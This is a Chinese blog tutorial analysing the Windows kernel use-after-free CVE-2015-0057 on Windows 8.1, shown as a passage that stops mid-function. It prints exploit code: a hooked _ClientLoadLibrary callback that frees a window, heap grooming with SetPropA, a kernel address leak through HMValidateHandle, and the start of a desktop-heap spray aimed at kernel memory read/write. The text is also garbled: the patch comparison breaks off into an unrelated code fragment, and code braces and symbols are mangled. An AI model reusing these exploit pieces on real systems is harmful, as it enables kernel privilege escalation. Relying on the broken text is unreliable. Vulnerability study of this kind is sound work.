> 原文链接: https://www.anquanke.com//post/id/192604 


# CVE-2015-0057：从Windows内核UAF到内核桌面堆分配


                                阅读量   
                                **997446**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01f75835f6338f3f04.jpg)](https://p3.ssl.qhimg.com/t01f75835f6338f3f04.jpg)



## 前言

本篇文章主要是对Windows内核漏洞CVE-2015-0057进行分析，漏洞的知识点特别多，也阅读了很多的资料，也很感谢给予我帮助的一些师傅，总之我会详细的记录自己对这个漏洞的理解和分析，我主要想分享一些我的学习方法，比如拿到一个Poc，该如何调试，如何判断自己每一步做对了，拿到IDA反编译的结果，该如何分析等等，先介绍一下这个漏洞的一些信息

|漏洞编号|漏洞类型|利用平台
|------
|CVE-2015-0057|Use After Free|Windows 8.1

也会就是说你在分析之前需要有下面的准备：
- Windows 8.1 x64 未打补丁的一个虚拟机用来测试Exploit
- Windows 7 x64 的一个虚拟机用来查询结构体
- IDA + Windbg 静态分析加动态分析，天下无敌


## 漏洞分析

### <a class="reference-link" name="%E8%A1%A5%E4%B8%81%E5%AF%B9%E6%AF%94"></a>补丁对比

让我们先来直观感受一下补丁前后的对比，这里我们直接定位问题函数`xxxDrawScrollBar`

补丁前：


    if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, dwOldProtect, &amp;dwOldProtect))
        return FALSE;

    return TRUE;
`}`
```

其中hook函数我们只需要销毁窗口即可

```
VOID Fake_ClientLoadLibrary()
`{`
    if (hookflag)
    `{`
        if (++hookcount == 2) // 保证执行一次
        `{`
            hookflag = 0;
            DestroyWindow(hWnd);
        `}`
    `}`
`}`
```

这样我们就构造了一个可以触发蓝屏的Poc，其中还需要注意的是，这里的hookflag和hookcount的目的只有一个，就是为了让DestroyWindow只执行一次，下面是导致蓝屏的过程图

[![](https://s2.ax1x.com/2019/11/09/MnSh9I.gif)](https://s2.ax1x.com/2019/11/09/MnSh9I.gif)

我们现在只能构造一个蓝屏的Poc，我们要利用这个漏洞，还得知道这个蓝屏能带来什么



## 漏洞利用

### <a class="reference-link" name="%E6%A1%8C%E9%9D%A2%E5%A0%86"></a>桌面堆

想要了解这个漏洞的其他细节，我们得继续分析回调函数后面的代码，我们祭出IDA，继续分析回调函数后面的流程，我们发现这里其实存在一次对结构体的写入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cb997fd1357be5bf.png)

在伪代码中显示如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01cde52975898ba073.png)

可能下面的那句话有点绕，这里我解释一下这句话啥意思，我们来看一下下面代码的例子你就懂了，其实就是判断**?**前面的值是否为真，若为真则返回**:**左边的值，假就返回右边的值

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011f1580aed7bb7111.png)

所以我们这里的漏洞代码就可能修改到 * psbInfo的值，也就是说我们达到一定条件可以改写结构体的内容，因为是修改tagWND中的结构，其关联的一些知识点就会涉及一些桌面堆的知识，所以我先给一些桌面堆的paper供大家参考，当然你不参考也可以继续往下看，我会尽量解释清楚
<li>Tarjei Mandt 师傅的论文：[https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf)
</li>
<li>小刀师傅对菜单管理的博客(主要看堆中菜单的管理和泄露地址部分)： [https://xiaodaozhi.com/exploit/71.html](https://xiaodaozhi.com/exploit/71.html)
</li>
<li>Windows 8 堆管理(主要看堆头部分就行)：[http://illmatics.com/Windows%208%20Heap%20Internals.pdf](http://illmatics.com/Windows%208%20Heap%20Internals.pdf)
</li>
<li>ntdebug 师傅分析桌面堆结构：[https://blogs.msdn.microsoft.com/ntdebugging/2007/01/04/desktop-heap-overview/](https://blogs.msdn.microsoft.com/ntdebugging/2007/01/04/desktop-heap-overview/)
</li>
<li>leviathansecurity 对堆头的介绍：[https://www.leviathansecurity.com/blog/understanding-the-windows-allocator-a-redux/](https://www.leviathansecurity.com/blog/understanding-the-windows-allocator-a-redux/)
</li>
简言之 win32k.sys 就是通过桌面堆来存储与给定桌面相关的 GUI 对象，包括窗口对象及其相关结构，如属性列表(tagPROPLIST)、窗口文本(_LARGE_UNICODE_STRING)、菜单(tagMENU)等，首先我们看几个涉及到的结构体，结构都取自Windows 7 x64，第一个就是当我们调用CreateWindow函数创建窗口的时候，会生成一个tagWND结构，大小是0x128，这个结构很大，我们只需要关注几个关键成员，也就是下图标注了颜色的几个结构

[![](https://p5.ssl.qhimg.com/t01d1cc807f2bfbe0e3.png)](https://p5.ssl.qhimg.com/t01d1cc807f2bfbe0e3.png)

下面依次介绍这几个结构：

**tagSBINFO**

大小 0x24，加上堆头 0x2c ，这也是我们 UAF 的对象

```
2: kd&gt; dt -v win32k!tagSBINFO -r
struct tagSBINFO, 3 elements, 0x24 bytes
   +0x000 WSBflags         : Int4B
   +0x004 Horz             : struct tagSBDATA, 4 elements, 0x10 bytes // 水平
      +0x000 posMin           : Int4B
      +0x004 posMax           : Int4B
      +0x008 page             : Int4B
      +0x00c pos              : Int4B
   +0x014 Vert             : struct tagSBDATA, 4 elements, 0x10 bytes // 垂直
      +0x000 posMin           : Int4B
      +0x004 posMax           : Int4B
      +0x008 page             : Int4B
      +0x00c pos              : Int4B
```

**tagPROPLIST**

大小 0x18，加上堆头0x20，由`SetPropA`函数创建

```
2: kd&gt; dt -v win32k!tagPROPLIST -r
struct tagPROPLIST, 3 elements, 0x18 bytes
   +0x000 cEntries         : Uint4B  // 表示aprop数组的大小
   +0x004 iFirstFree       : Uint4B  // 表示当前正在添加第几个tagPROP
   +0x008 aprop            : [1] struct tagPROP, 3 elements, 0x10 bytes // 一个单项的tagProp
      +0x000 hData            : Ptr64 to Void // 对应hData
      +0x008 atomKey          : Uint2B // 对应lpString
      +0x00a fs               : Uint2B // 无法控制
```

下面介绍一下 SetPropA 这个函数，这个函数用来设置tagPROPLIST结构，若该属性已经设置过，则直接修改其数据，若未设置过，则在数组中添加一个条目；若添加条目时发现，cEntries和iFirstFree相等，则表示props数组已满，此时会重新分配堆空间，并将原来的数据复制进去。如果我们利用UAF增大了cEntries的值，在数组已满的情况下，再次调用 SetPropA 函数，就会导致缓冲区溢出，后面我们就是利用这里造成进一步的利用

```
BOOL SetPropA(
  HWND   hWnd,
  LPCSTR lpString,
  HANDLE hData
);
```

**_LARGE_UNICODE_STRING**

大小 0x10，加上堆头 0x18，由`RtlInitLargeUnicodeString`函数可以初始化Buffer， `NtUserDefSetText`可以设置 tagWND 的 strName 字段，此函数可以做到桌面堆大小的任意分配

```
2: kd&gt; dt -v win32k!_LARGE_UNICODE_STRING -r
struct _LARGE_UNICODE_STRING, 4 elements, 0x10 bytes
   +0x000 Length           : Uint4B
   +0x004 MaximumLength    : Bitfield Pos 0, 31 Bits
   +0x004 bAnsi            : Bitfield Pos 31, 1 Bit
   +0x008 Buffer           : Ptr64 to Uint2B
```

**tagMENU**

大小 0x98，加上堆头 0xa0，由CreateMenu()创建，可用来填补一些内存，并且后面还可以用来任意地址读写

```
2: kd&gt; dt -v win32k!tagMENU
struct tagMENU, 19 elements, 0x98 bytes
   +0x000 head             : struct _PROCDESKHEAD, 5 elements, 0x28 bytes
   +0x028 fFlags           : Uint4B
   +0x02c iItem            : Int4B
   +0x030 cAlloced         : Uint4B
   +0x034 cItems           : Uint4B
   +0x038 cxMenu           : Uint4B
   +0x03c cyMenu           : Uint4B
   +0x040 cxTextAlign      : Uint4B
   +0x048 spwndNotify      : Ptr64 to struct tagWND, 170 elements, 0x128 bytes
   +0x050 rgItems          : Ptr64 to struct tagITEM, 20 elements, 0x90 bytes
   +0x058 pParentMenus     : Ptr64 to struct tagMENULIST, 2 elements, 0x10 bytes
   +0x060 dwContextHelpId  : Uint4B
   +0x064 cyMax            : Uint4B
   +0x068 dwMenuData       : Uint8B
   +0x070 hbrBack          : Ptr64 to struct HBRUSH__, 1 elements, 0x4 bytes
   +0x078 iTop             : Int4B
   +0x07c iMaxTop          : Int4B
   +0x080 dwArrowsOn       : Bitfield Pos 0, 2 Bits
   +0x084 umpm             : struct tagUAHMENUPOPUPMETRICS, 2 elements, 0x14 bytes

```

### <a class="reference-link" name="%E5%88%9D%E5%A7%8B%E5%8C%96%E9%98%B6%E6%AE%B5"></a>初始化阶段

因为我们Poc里面是销毁的tagWND窗口，为了查看uaf之后改变了什么，我们这里初始化很多的tagWND，并且设置tagPROPLIST，64位的 tagSBINFO 大小是 0x28 ，而一个 tagPROPLIST 大小为0x18，当再增加一个 tagPROP 的时候，其大小刚好为 (0x18 + 0x10) == 0x28，也就是说我们刚好可以占用释放的那块 tagSBINFO ，那也就可以监视 UAF 前后内存的变化，下面是窗口堆初始化函数实现

```
BOOL InitWindow(HWND* hwndArray,int count)
`{`
    WNDCLASSEXA wn;

    wn.cbSize = sizeof(WNDCLASSEX);
    wn.style = 0;
    wn.lpfnWndProc = WndProc;
    wn.cbClsExtra = 0;
    wn.cbWndExtra = 0;
    wn.hInstance = GetModuleHandleA(NULL);
    wn.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wn.hCursor = LoadCursor(NULL, IDC_ARROW);
    wn.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wn.lpszMenuName = NULL;
    wn.lpszClassName = sz_ClassName;
    wn.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (regflag)
    `{`
        if (!RegisterClassExA(&amp;wn))
        `{`
            cout &lt;&lt; "[*] Failed to register window.nError code is " &lt;&lt; GetLastError() &lt;&lt; endl;
            system("pause");
            return FALSE;
        `}`
        regflag = FALSE;
    `}`

    for (int i = 0; i &lt; count; i++)
    `{`

        hwndArray[i] = CreateWindowExA(
            0,
            sz_ClassName,
            0,
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            (HWND)NULL,
            (HMENU)NULL,
            NULL,
            (PVOID)NULL
        );

        if (hwndArray[i] == NULL)
            return FALSE;

        SetPropA(hwndArray[i], (LPCSTR)(1), (HANDLE)0xAAAABBBBAAAABBBB);
    `}`

    return TRUE;
`}`
```

初始化设置完成之后理想的桌面堆应该如下图，两个一组，依次循环

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ce49a56b237b6b07.png)

接下来就是我们的监视桌面堆的阶段了，我们来查看一下 UAF 之后改变了什么，不过这里就会有个问题，我们应该如何监视我们的桌面堆呢？下面是我最常用的代码片断，参考自[sam-b师傅的GitHub项目](https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp)

```
__debugbreak();
PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hwnd, 1);
__debugbreak();
UINT64 addr = (UINT64)tagWND-&gt;pSelf; // 这里赋值一下再打印是为了防止VS编译器的优化
printf("[+] spray_step_one[0] address is : 0x%pn", addr);
```

实现函数如下， 我们在 user32 中寻找 HMValidateHandle 函数, 该函数在 IsMenu 函数中有被调用，所以可以通过硬编码比较的方式获取 HMValidateHandle 的地址，然而这个函数有一个 pSelf 指针，可以泄露内核地址

```
extern "C" lHMValidateHandle pHmValidateHandle = NULL;

BOOL FindHMValidateHandle() `{`
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) `{`
        printf("[*] Failed to load user32n");
        return FALSE;
    `}`

    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
    if (pIsMenu == NULL) `{`
        printf("[*] Failed to find location of exported function 'IsMenu' within user32.dlln");
        return FALSE;
    `}`
    unsigned int uiHMValidateHandleOffset = 0;
    for (unsigned int i = 0; i &lt; 0x1000; i++) `{`
        BYTE* test = pIsMenu + i;
        if (*test == 0xE8) `{`
            uiHMValidateHandleOffset = i + 1;
            break;
        `}`
    `}`
    if (uiHMValidateHandleOffset == 0) `{`
        printf("[*] Failed to find offset of HMValidateHandle from location of 'IsMenu'n");
        return FALSE;
    `}`

    unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
    unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
    //The +11 is to skip the padding bytes as on Windows 10 these aren't nops
    pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
    return TRUE;
`}`
```

因此我们就可以这样检测堆结构

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cb52ecac6959e971.png)

因此我们第一步的检验动态图如下所示，我们泄露的是tagWND的地址，加上 a8 的偏移即是我们的 tagPROPLIST ，这里我们可以看到，在写入之后我们有个 0x2 的值变为了 0xe ，这个东西是什么呢？对比一下 tagPROPLIST 的结构体你会发现刚好是 cEntries 的值，也就是说我们可以造成一次溢出

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/11/09/MnA5mq.gif)

### <a class="reference-link" name="%E4%BA%8B%E6%83%85%E5%B9%B6%E4%B8%8D%E6%98%AF%E9%82%A3%E4%B9%88%E9%A1%BA%E5%88%A9"></a>事情并不是那么顺利

我们把 cEntries 的值变大了，再次调用 SetPropA 就会溢出，然而我们新增加的 tagPROP 并不是完全可控的，我们再来看看这个结构，hData 和 atomKey 完全可控的也就 8 字节，fs 和内存对齐后面的就完全无法控制，也就是说我们需要利用好这 8 字节的溢出

```
1: kd&gt; dt -v win32k!tagPROP
struct tagPROP, 3 elements, 0x10 bytes
   +0x000 hData            : Ptr64 to Void // 8字节可控
   +0x008 atomKey          : Uint2B // 2字节大概可控
   +0x00a fs               : Uint2B // 无法控制
```

前面介绍过`_LARGE_UNICODE_STRING` 结构，我们知道它的Buffer结构是一个指针，我们想通过它来实现任意内存访问，所以这里我们想的是在 tagPROP 后面接上一个 `_LARGE_UNICODE_STRING` 结构，修改Buffer字段，然而你会发现，其实我们并不能完全控制到 Buffer 那里

```
2: kd&gt; dt -v win32k!_LARGE_UNICODE_STRING -r
struct _LARGE_UNICODE_STRING, 4 elements, 0x10 bytes
   +0x000 Length           : Uint4B // 可控
   +0x004 MaximumLength    : Bitfield Pos 0, 31 Bits // 可控
   +0x004 bAnsi            : Bitfield Pos 31, 1 Bit  // 可控
   +0x008 Buffer           : Ptr64 to Uint2B // 想要修改这里,但是刚好是atomKey和fs属性,不完全可控
```

不能覆盖到哪里，我们就得想其他的办法，如果你看过前面的一些堆头的paper，那你可能会想到，我们这里最终选择的是`_HEAP_ENTR`这个结构，其大小是 0x10，这里主要关注注释的内容，学过PWN堆部分的小伙伴有没有很眼熟，什么prev_size，size，fd，bk啥的对比过来不就很眼熟了么，只不过这里有一个`SmallTagIndex`的校验码，这是Windows的一个安全机制，为了防止堆头被修改，你可以类比PWN保护机制中的Canary

```
1: kd&gt; dt -v !_HEAP_ENTRY
nt!_HEAP_ENTRY
struct _HEAP_ENTRY, 22 elements, 0x10 bytes
   +0x000 PreviousBlockPrivateData : Ptr64 to Void
   +0x008 Size             : Uint2B // 当前块的大小
   +0x00a Flags            : UChar // 是否空闲
   +0x00b SmallTagIndex    : UChar // 安全校验码
   +0x00c PreviousSize     : Uint2B // 前一块的大小
   +0x00e SegmentOffset    : UChar
   +0x00e LFHFlags         : UChar
   +0x00f UnusedBytes      : UChar
   +0x008 CompactHeader    : Uint8B
   +0x000 Reserved         : Ptr64 to Void
   +0x008 FunctionIndex    : Uint2B
   +0x00a ContextValue     : Uint2B
   +0x008 InterceptorValue : Uint4B
   +0x00c UnusedBytesLength : Uint2B
   +0x00e EntryOffset      : UChar
   +0x00f ExtendedBlockSignature : UChar
   +0x000 ReservedForAlignment : Ptr64 to Void
   +0x008 Code1            : Uint4B
   +0x00c Code2            : Uint2B
   +0x00e Code3            : UChar
   +0x00f Code4            : UChar
   +0x008 AgregateCode     : Uint8B
```

我们这里想的是覆盖堆头的 Size 字段，伪造堆的大小，当然这里我们也需要绕过保护，先不管保护怎么绕过，如果我们在下一个堆块后面放置一个 tagMENU 结构，然后我们将整块给 free 掉，因为 tagMENU 句柄未变，所以我们这里会再次产生一个 UAF 漏洞，这里我先贴桌面堆喷射实现的代码

```
BOOL SprayObject()
`{`
    int j = 0;
    CHAR o1str[OVERLAY1_SIZE - _HEAP_BLOCK_SIZE] = `{` 0 `}`;
    CHAR o2str[OVERLAY2_SIZE - _HEAP_BLOCK_SIZE] = `{` 0 `}`;
    LARGE_UNICODE_STRING o1lstr, o2lstr;

    // build first overlay
    memset(o1str, 'x43', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
    RtlInitLargeUnicodeString(&amp;o1lstr, (WCHAR*)o1str, (UINT)-1, OVERLAY1_SIZE - _HEAP_BLOCK_SIZE - 2);

    // build second overlay
    memset(o2str, 'x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
    RtlInitLargeUnicodeString(&amp;o2lstr, (WCHAR*)o2str, (UINT)-1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);

    SHORT unused_win_index = 0x20;

    for (SHORT i = 0; i &lt; SHORT(MAX_OBJECTS - 0x20); i++)
    `{`
        // property list
